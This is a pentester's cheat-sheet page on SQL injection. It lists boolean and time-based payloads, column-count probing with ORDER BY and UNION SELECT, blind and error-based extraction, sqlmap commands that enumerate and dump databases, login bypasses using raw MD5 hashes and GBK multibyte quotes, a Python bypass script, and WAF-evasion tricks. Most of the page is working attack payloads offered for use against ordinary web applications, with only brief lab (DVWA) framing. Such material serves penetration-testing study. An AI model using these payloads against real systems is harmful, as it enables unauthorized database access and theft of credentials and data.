# SQL injection

* [What is SQL ?](sql.md)
* How Dangerous is it ?
  * P! - Critcal&#x20;
  * (CVSS) is 9-10
* some sql basics
  * Sql statements syntax

```
show databases;
```

<figure><img src="../../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

## Insert Statement <a href="#insert-statement" id="insert-statement"></a>

#### Modify the password of existing object/user <a href="#modify-password-of-existing-object-user" id="modify-password-of-existing-object-user"></a>

To do so you should try to **create a new object named as the "master object"** (probably **admin** in case of users) modifying something:

* Create a user named: **AdMIn** (uppercase & lowercase letters)
* Create a user named: **admin=**
* **SQL Truncation Attack** (when there is some **length limit** in the username or email) --> Create a user with the name: **admin \[a lot of spaces] a**
*   [**`SQL Truncation Attack`**](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/interesting-outdated-attacks/sql-truncation)

    If the database is vulnerable and the max number of chars for a username is 30 and you want to impersonate the user **admin**, try to create a username called: "_admin \[30 spaces] a_" and any password.



## How to Exploit it ?&#x20;

1. **Find the injection Point.**
2. **Fix Quary or Balance SQLI**
   1. **in GET we add '--+**
   2. **in POST we add '--**<mark style="color:red;">**SPACE**</mark>** or '**<mark style="color:red;">**#**</mark>
3. **Find the total number of vuln Columns**&#x20;
   1. **Order by **<mark style="color:orange;">**n**</mark>
   2. **UNION select 1,2,3,4,**<mark style="color:red;">**n-1**</mark>** => look Different number of Columns**
   3. **WHERE OR HAVING**
   4. **version() to test**&#x20;

## How to perform a Query

```sql
"SELECT * From users where username='ad' or 1=1--'";
```

### SQL Logic

```sql
true
1
1>0
2-1
0+1
1*1
1%2
1 & 1
1&1
1 && 2
1&&2
-1 || 1
-1||1
-1 oR 1=1
1 aND 1=1
(1)oR(1=1)
(1)aND(1=1)
-1/**/oR/**/1=1
1/**/aND/**/1=1
1'
1'>'0
2'-'1
0'+'1
1'*'1
1'%'2
1'&'1'='1
1'&&'2'='1
-1'||'1'='1
-1'oR'1'='1
1'aND'1'='1
1"
1">"0
2"-"1
0"+"1
1"*"1
1"%"2
1"&"1"="1
1"&&"2"="1
-1"||"1"="1
-1"oR"1"="1
1"aND"1"="1
1`
1`>`0
2`-`1
0`+`1
1`*`1
1`%`2
1`&`1`=`1
1`&&`2`=`1
-1`||`1`=`1
-1`oR`1`=`1
1`aND`1`=`1
1')>('0
2')-('1
0')+('1
1')*('1
1')%('2
1')&'1'=('1
1')&&'1'=('1
-1')||'1'=('1
-1')oR'1'=('1
1')aND'1'=('1
1")>("0
2")-("1
0")+("1
1")*("1
1")%("2
1")&"1"=("1
1")&&"1"=("1
-1")||"1"=("1
-1")oR"1"=("1
1")aND"1"=("1
1`)>(`0
2`)-(`1
0`)+(`1
1`)*(`1
1`)%(`2
1`)&`1`=(`1
1`)&&`1`=(`1
-1`)||`1`=(`1
-1`)oR`1`=(`1
1`)aND`1`=(`1

```

### **Comments** <a href="#comments" id="comments"></a>

Copy

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

### use Limit&#x20;

```
select pass from users limit 0,1;
```

### How to union the results

```
select username,pass from User UNION select 1,2;
```

### information\_schema

```sql
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| SQL_FUNCTIONS                         |
| SYSTEM_VARIABLES                      |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| CLIENT_STATISTICS                     |
| INDEX_STATISTICS                      |
| INNODB_FT_CONFIG                      |
| GEOMETRY_COLUMNS                      |
| INNODB_SYS_TABLESTATS                 |
| SPATIAL_REF_SYS                       |
| USER_STATISTICS                       |
| INNODB_TRX                            |
| INNODB_CMP_PER_INDEX                  |
| INNODB_METRICS                        |
| INNODB_FT_DELETED                     |
| INNODB_CMP                            |
| THREAD_POOL_WAITS                     |
| INNODB_CMP_RESET                      |
| THREAD_POOL_QUEUES                    |
| TABLE_STATISTICS                      |
| INNODB_SYS_FIELDS                     |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_LOCKS                          |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_CMPMEM                         |
| THREAD_POOL_GROUPS                    |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_FT_BEING_DELETED               |
| INNODB_SYS_FOREIGN                    |
| INNODB_CMPMEM_RESET                   |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_INDEXES                    |
| INNODB_BUFFER_PAGE                    |
| INNODB_SYS_VIRTUAL                    |
| user_variables                        |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_LOCK_WAITS                     |
| THREAD_POOL_STATS                     |
```

```sql
SELECT table_name from information_schema.tables  where table_schema=database();
```

### Use wildcard

```
where username='%F%'
where username='%F'
having username='A%'
```

### How to test

1. **add **<mark style="color:red;">**`'"`**</mark>
2. <mark style="color:red;">**`" or 1=1#`**</mark>**`   ``|`` `` `**<mark style="color:red;">**`' or 1=1#`**</mark>&#x20;

in DVWA

<figure><img src="../../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

### SQLMAP

```sh
sqlmap -r req.txt --dbs --random-agent --risk 3 --level 5 -p username,password
```

\-**`r`   =>**   File name

**`-dbs =>`** Enumerate DBMS databases

**`--level=LEVEL =>`** Level of tests to perform (1-5, default 1)

**`--risk=RISK =>`**     Risk of tests to perform (1-3, default 1)

**`-p`** TESTPARAMETER  Testable parameter(s)



Assuming you've tested a parameter with `'` and it is injectable, run SQL map against the URL:

```sql
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbms=mysql
```

It may not run unless you specify the database type.

Get the databases:

```sql
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbs --dbms=mysql
```

Get the tables in a database:

```sql
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --tables -D [database name]
```

Get the columns in a table:

```sql
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --columns -D [database name] -T [table name]
```

Dump a table:

```sql
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dump -D [database name] -T [tabl
```

### Confirming with Timing <a href="#confirming-with-timing" id="confirming-with-timing"></a>

In some cases you **won't notice any change** on the page you are testing. Therefore, a good way to **discover blind SQL injections** is making the DB perform actions and will have an **impact on the time** the page need to load. Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:



```sql
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## Exploiting Union Based <a href="#exploiting-union-based" id="exploiting-union-based"></a>

### Detecting number of columns <a href="#detecting-number-of-columns" id="detecting-number-of-columns"></a>

If you can see the output of the query this is the best way to exploit it. First of all, wee need to find out the **number** of **columns** the **initial request** is returning. This is because **both queries must return the same number of columns**. Two methods are typically used for this purpose:

### **Order/Group by**

To determine the number of columns in a query, incrementally adjust the number used in **ORDER BY** or **GROUP BY** clauses until a false response is received. Despite the distinct functionalities of **GROUP BY** and **ORDER BY** within SQL, both can be utilized identically for ascertaining the query's column count.



```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```



```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

### **UNION SELECT**

Select more and more null values until the query is correct:



```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

_You should use `null`values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case._

## Exploiting Blind SQLi <a href="#exploiting-blind-sqli" id="exploiting-blind-sqli"></a>

In this case you cannot see the results of the query or the errors, but you can **distinguished** when the query **return** a **true** or a **false** response because there are different contents on the page. In this case, you can abuse that behaviour to dump the database char by char:



```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

## Exploiting Error Blind SQLi <a href="#exploiting-error-blind-sqli" id="exploiting-error-blind-sqli"></a>

This is the **same case as before** but instead of distinguish between a true/false response from the query you can **distinguish between** an **error** in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:



```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

## Exploiting Time-Based SQLi <a href="#exploiting-time-based-sqli" id="exploiting-time-based-sqli"></a>

In this case there **isn't** any way to **distinguish** the **response** of the query based on the context of the page. But, you can make the page **take longer to load** if the guessed character is correct. We have already saw this technique in use before in order to [confirm a SQLi vuln](https://book.hacktricks.xyz/pentesting-web/sql-injection#confirming-with-timing).



```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

## [Login bypass List](login-bypass-list.md)

## Raw hash authentication Bypass <a href="#raw-hash-authentication-bypass" id="raw-hash-authentication-bypass"></a>

```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

This query showcases a vulnerability when MD5 is used with true for raw output in authentication checks, making the system susceptible to SQL injection. Attackers can exploit this by crafting inputs that, when hashed, produce unexpected SQL command parts, leading to unauthorized access.

```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```

#### Injected hash authentication Bypass <a href="#injected-hash-authentication-bypass" id="injected-hash-authentication-bypass"></a>

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

### **Recommended list**:

You should use as a username each line of the list and as password _**Pass1234.**_ _(This payloads are also included in the big list mentioned at the beginning of this section)_

[1KBsqli-hashbypass.txt](https://129538173-files.gitbook.io/\~/files/v0/b/gitbook-legacy-files/o/assets%2F-L\_2uGJGU7AVNRcqRvEi%2F-Lgxw4OPe8L5QKmPID0F%2F-Lgy-zrwLPf0cDzTUfoW%2Fsqli-hashbypass.txt?alt=media\&token=0b95f2e0-48b8-422e-a357-53d9ab271bd7)

### GBK Authentication Bypass <a href="#gbk-authentication-bypass" id="gbk-authentication-bypass"></a>

IF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 (_╘'_)



```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

### Python script

```python
import requests
url = "http://example.com/index.php" 
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text
```

### WAF Bypass



No Space (%20) - bypass using whitespace alternatives

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

No Whitespace - bypass using comments

```sql
?id=1/*comment*/and/**/1=1/**/--
```

No Whitespace - bypass using parenthesis

```sql
?id=(1)and(1)=(1)--
```

No Comma - bypass using OFFSET, FROM and JOIN

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

Blacklist using keywords - bypass using uppercase/lowercase

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Blacklist using keywords case insensitive - bypass using an equivalent operator

```sql
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

Information\_schema.tables Alternative

```sql
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

Version Alternative

```sql
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```

### &#x20;Other resources



* Detect SQLi
  * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
  * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
* MySQL:
  * \[PentestMonkey's mySQL injection cheat sheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet))
  * \[Reiners mySQL injection Filter Evasion Cheatsheet] ([https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/))
  * [Alternative for Information\_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information\_schema-tables-in-mysql/)
  * [The SQL Injection Knowledge base](https://websec.ca/kb/sql\_injection)
* MSSQL:
  * \[EvilSQL's Error/Union/Blind MSSQL Cheatsheet] ([http://evilsql.com/main/page2.php](http://evilsql.com/main/page2.php))
  * \[PentestMonkey's MSSQL SQLi injection Cheat Sheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet))
* ORACLE:
  * \[PentestMonkey's Oracle SQLi Cheatsheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet))
* POSTGRESQL:
  * \[PentestMonkey's Postgres SQLi Cheatsheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet))
* Others
  * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
  * \[Access SQLi Cheatsheet] ([http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html))
  * \[PentestMonkey's Ingres SQL Injection Cheat Sheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet))
  * \[Pentestmonkey's DB2 SQL Injection Cheat Sheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet))
  * \[Pentestmonkey's Informix SQL Injection Cheat Sheet] ([http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet))
  * \[SQLite3 Injection Cheat sheet] ([https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet))
  * \[Ruby on Rails (Active Record) SQL Injection Guide] ([http://rails-sqli.org/](http://rails-sqli.org/))
  * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
  * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
  * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* Second Order:
  * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
  * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
* Sqlmap:
  * [#SQLmap protip ](https://twitter.com/zh4ck/status/972441560875970560)



\
